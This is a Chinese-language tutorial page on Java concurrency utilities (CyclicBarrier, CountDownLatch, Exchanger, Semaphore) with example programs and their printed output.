<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex">A synchronization aid that allows a set of threads to all wait for each other to reach a common barrier point. 
“允许一组线程互相等待到达一个共同的屏障点”的同步算法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CyclicBarrierExample1</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">CyclicBarrier</span> barrier <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CyclicBarrier</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"All parties action finished"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ActionRunnable</span><span class="token punctuation">(</span>barrier<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"T1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ActionRunnable</span><span class="token punctuation">(</span>barrier<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"T2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ActionRunnable</span><span class="token punctuation">(</span>barrier<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"T3"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ActionRunnable</span><span class="token punctuation">(</span>barrier<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"T4"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">ActionRunnable</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">CyclicBarrier</span> barrier<span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token class-name">ActionRunnable</span><span class="token punctuation">(</span><span class="token class-name">CyclicBarrier</span> barrier<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>barrier <span class="token operator">=</span> barrier<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spend</span><span class="token punctuation">(</span><span class="token class-name">ThreadLocalRandom</span><span class="token punctuation">.</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                barrier<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"- await finished"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">BrokenBarrierException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>测试结果：</p>
<pre class="line-numbers language-none"><code class="language-none">T1 finnish task（1651682474323）
T4 finnish task（1651682475329）
T3 finnish task（1651682480338）
T2 finnish task（1651682482329）
All parties action finished
T2- await finished
T1- await finished
T4- await finished
T3- await finished<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="示例2：使用reset-重置">示例2：使用reset()重置</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token class-name">CyclicBarrier</span> barrier <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CyclicBarrier</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"All parties action finished"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ActionRunnable</span><span class="token punctuation">(</span>barrier<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"T1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ActionRunnable</span><span class="token punctuation">(</span>barrier<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"T2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spendSeconds</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barrier<span class="token punctuation">.</span><span class="token function">getNumberWaiting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    barrier<span class="token punctuation">.</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spendSeconds</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barrier<span class="token punctuation">.</span><span class="token function">getNumberWaiting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="CountDownLatch-和-CyclicBarrier-的区别">CountDownLatch 和 CyclicBarrier 的区别</h2>
<table>
<thead>
<tr>
<th>CountDownLatch</th>
<th>CyclicBarrier</th>
</tr>
</thead>
<tbody>
<tr>
<td>不可 reset</td>
<td>可以循环使用的</td>
</tr>
<tr>
<td>CountDownLatch工作线程之间互不关心</td>
<td>工作线程互相等待到达一个共同的屏障点</td>
</tr>
</tbody>
</table>
<h1>Exchanger</h1>
<ol>
<li>需要成对出现，否则单出来的一个线程同样会进入阻塞状态</li>
<li>如果成对的线程，其中一个无法到达“<code>交换点（Exchange Point）</code>”，另一个会一直等待，直到超时/一直阻塞。</li>
<li><strong>线程对之间交换的对象，是同一个地址的引用，会存在线程不安全的问题</strong>，可以考虑使用Atomic包装。</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">一个同步点，在这个同步点上，线程之间可以组队并互相交换数据。每个线程会在进入交换方法时提供给伙伴线程匹配一些对象，并在返回时接收其伙伴的提供的对象。一个交换器可以被看作是一个同步队列的双向形式。交换器在遗传算法和流水线设计等应用中可能是有用的。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Exchanger</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">TimeUnit</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ExchangerText</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">final</span> <span class="token class-name">Exchanger</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> exchanger <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exchanger</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spend</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token comment">// 交换点，成对的线程同时达到这个交换点才会交换数据</span>
                <span class="token class-name">String</span> msg <span class="token operator">=</span> exchanger<span class="token punctuation">.</span><span class="token function">exchange</span><span class="token punctuation">(</span><span class="token string">"（message from "</span> <span class="token operator">+</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".）"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" got "</span> <span class="token operator">+</span> msg <span class="token operator">+</span> <span class="token string">"["</span> <span class="token operator">+</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">"T-A"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spend</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token comment">// 交换点，成对的线程同时达到这个交换点才会交换数据</span>
                <span class="token class-name">String</span> msg <span class="token operator">=</span> exchanger<span class="token punctuation">.</span><span class="token function">exchange</span><span class="token punctuation">(</span><span class="token string">"（message from "</span> <span class="token operator">+</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".）"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" got "</span> <span class="token operator">+</span> msg <span class="token operator">+</span> <span class="token string">"["</span> <span class="token operator">+</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">"T-B"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

输出结果：
<span class="token class-name">T</span><span class="token operator">-</span><span class="token class-name">A</span> finnish task（<span class="token number">1651715733432</span>）
<span class="token class-name">T</span><span class="token operator">-</span><span class="token class-name">B</span> finnish task（<span class="token number">1651715740432</span>）
<span class="token class-name">T</span><span class="token operator">-</span><span class="token class-name">B</span> got （message from <span class="token class-name">T</span><span class="token operator">-</span><span class="token class-name">A</span><span class="token punctuation">.</span>）<span class="token punctuation">[</span><span class="token number">1651715740432</span><span class="token punctuation">]</span>
<span class="token class-name">T</span><span class="token operator">-</span><span class="token class-name">A</span> got （message from <span class="token class-name">T</span><span class="token operator">-</span><span class="token class-name">B</span><span class="token punctuation">.</span>）<span class="token punctuation">[</span><span class="token number">1651715740432</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>Semaphore</h1>
<p>注册/回收许可证</p>
<ol>
<li>
<p><code>acquire()/release()</code> ： 相当于 acquire(1)/release(1)</p>
</li>
<li>
<p><code>acquire(int permits) /release(int permits)</code></p>
</li>
<li>
<p><code>acquireUninterruptibly()/acquireUninterruptibly(int permits) </code> 不可打断，不会抛出InterruptedException异常</p>
</li>
<li>
<p><code>drainPermits()</code> 获取所有的许可证</p>
</li>
<li>
<p><code>tryAcquire()/tryAcquire(int permits)</code>  不可打断，不会抛出InterruptedException异常，拿不到许可证，不会阻塞，放弃获取，继续执行</p>
</li>
<li>
<p><code>getQueueLength()</code> 返回等待获取的线程数的评估值</p>
</li>
<li>
<p><code>availablePermits()</code>返回此信号量中可用的当前许可数（评估值）</p>
</li>
</ol>
<ul>
<li>DEMO-1：可中断的许可证请求（会抛出InterruptedException）</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SemaphoreExample</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">final</span> <span class="token class-name">Semaphore</span> semaphore <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Semaphore</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TaskRunnable</span><span class="token punctuation">(</span>semaphore<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"T1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TaskRunnable</span><span class="token punctuation">(</span>semaphore<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"T2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">TaskRunnable</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">Semaphore</span> semaphore<span class="token punctuation">;</span>
        <span class="token class-name">TaskRunnable</span><span class="token punctuation">(</span><span class="token class-name">Semaphore</span> semaphore<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>semaphore <span class="token operator">=</span> semaphore<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span>  <span class="token string">" ask for permits"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">// 请求执行许可证</span>
                semaphore<span class="token punctuation">.</span><span class="token function">acquire</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span>  <span class="token string">" got permits"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spend</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
                <span class="token comment">// 释放许可证</span>
                semaphore<span class="token punctuation">.</span><span class="token function">release</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-tcl" data-language="tcl"><code class="language-tcl">T1 ask for permits
T1 got permits
T2 ask for permits
T1 finnish task <span class="token punctuation">[</span>1651772544344<span class="token punctuation">]</span>
T2 got permits
T2 finnish task <span class="token punctuation">[</span>1651772549361<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>DEMO-2</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SemaphoreExample2</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">final</span> <span class="token class-name">Semaphore</span> semaphore <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Semaphore</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TaskRunnable</span><span class="token punctuation">(</span>semaphore<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"T1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TaskRunnable</span><span class="token punctuation">(</span>semaphore<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"T2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">TaskRunnable</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">Semaphore</span> semaphore<span class="token punctuation">;</span>
        <span class="token class-name">TaskRunnable</span><span class="token punctuation">(</span><span class="token class-name">Semaphore</span> semaphore<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>semaphore <span class="token operator">=</span> semaphore<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token comment">// 请求执行许可证</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span>  <span class="token string">" ask for permits"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">boolean</span> tryResult <span class="token operator">=</span> semaphore<span class="token punctuation">.</span><span class="token function">tryAcquire</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span>  <span class="token punctuation">(</span>tryResult <span class="token operator">?</span> <span class="token string">" got permits"</span> <span class="token operator">:</span> <span class="token string">" ignore permits and continue"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spend</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
                <span class="token comment">// 释放许可证</span>
                semaphore<span class="token punctuation">.</span><span class="token function">release</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">T2 ask for permits
T1 ask for permits
T2 got permits
T1 ignore permits and continue
